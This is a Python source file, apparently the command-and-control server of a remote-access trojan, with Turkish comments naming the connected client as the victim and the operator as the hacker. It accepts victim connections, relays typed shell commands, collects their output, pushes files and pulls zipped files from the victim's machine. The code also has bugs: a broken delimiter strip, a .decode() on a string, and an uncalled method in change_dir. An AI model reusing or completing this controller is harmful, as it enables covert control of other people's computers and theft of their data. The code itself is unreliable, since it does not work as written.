import socket
import os


CHUNKSIZE = 4 * 1024
DELIMETER = "<END_OF_RESULTS>"


class ServerConnection:
    def __init__(self):
        # creates a TCP socket for server
        self.socket = socket.socket(socket.AF_INET, socket . SOCK_STREAM)

    def CreateConnection(self, ip="192.168.2.42", port=8080):
        self.server_ip = ip
        self.server_port = port
        self.address =(self.server_ip, self.server_port)
        self.socket.bind(self.address)

    def Listen(self, backlog=5):
        self.socket.listen(backlog)

    def AccepConnection(self):
        self.client_conn, self.client_address = self.socket.accept()
        print("/t/t [+] Baglanti kuruluyor"+ self.client_address[0]+ "on port "+str(self.client_address[1]))
        return(self.client_conn, self.client_address)

    def send_data(self, user_input):
        user_input_bytes = bytes(user_input, "utf-8")
        self.client_conn.send(user_input_bytes)

    def receive_data(self):
        received_data_bytes = self.client_conn.recv(CHUNKSIZE)
        self.data = received_data_bytes.decode('utf-8')
        return self.data

    def receive_command_result(self):
        print("Getting Command Results")
        result = b''

        while True:
            chunk = self.client_conn.recv(CHUNKSIZE)

            if chunk.endswith(DELIMETER.encode()):
                chunk += chunk[:-len(DELIMETER)]
                result += chunk
                break

            result += chunk

        print(result.decode())

    def send_file(self, filename):
        print("[+] Sending file")
        with open(filename, "rb") as file:
            chunk = file.read(CHUNKSIZE)

            while len(chunk) > 0:
                self.client_conn.send(chunk)

                chunk = file.read(CHUNKSIZE)

            self.client_conn.send(DELIMETER.encode())

    # client (victim) tarafindan Zip dosyasinin alinmasi icin
    def receive_zipped(self, zipped_file):
        print("[+] zip dosyasi aliniyor")
        full_file = b''
        while True:
            chunk = self.client_conn.recv(CHUNKSIZE)
            if chunk.endswith(DELIMETER.decode()):
                chunk = chunk[:-len(DELIMETER)]

                full_file += chunk
                break
            full_file += chunk

        with open(zipped_file, "wb") as file:
            file.write(full_file)

        print("indirme islemi basariyla gerceklesmistir")

    def change_dir(self):
        print("dir degistiriliyor")
        #
        pwd = self.receive_data
        while True:
            print(f'{pwd} >> ', end=" ")
            # sununcunu (hackerin yazmis oldugu komutu hackere aktarma)
            user_command = input("")
            self.send_data(user_command)
            if user_command == "stop":
                break

            # clientten gelen present working dir
            pwd = self.receive_data()
